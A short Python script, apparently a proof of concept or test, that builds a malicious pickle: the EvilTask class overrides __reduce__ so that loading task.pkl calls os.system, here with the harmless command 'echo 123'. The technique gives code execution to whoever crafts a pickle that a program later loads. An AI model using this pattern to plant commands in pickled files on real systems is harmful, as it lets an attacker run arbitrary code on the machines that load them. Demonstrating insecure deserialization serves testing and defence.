import os
import pickle

from task import Task


class EvilTask(Task):

    def __reduce__(self):
        return (os.system, ("echo 123",))


if __name__ == '__main__':
    task = EvilTask('evil', 'echo 123')

    with open('task.pkl', mode='wb') as f:
        pickle.dump(task, file=f)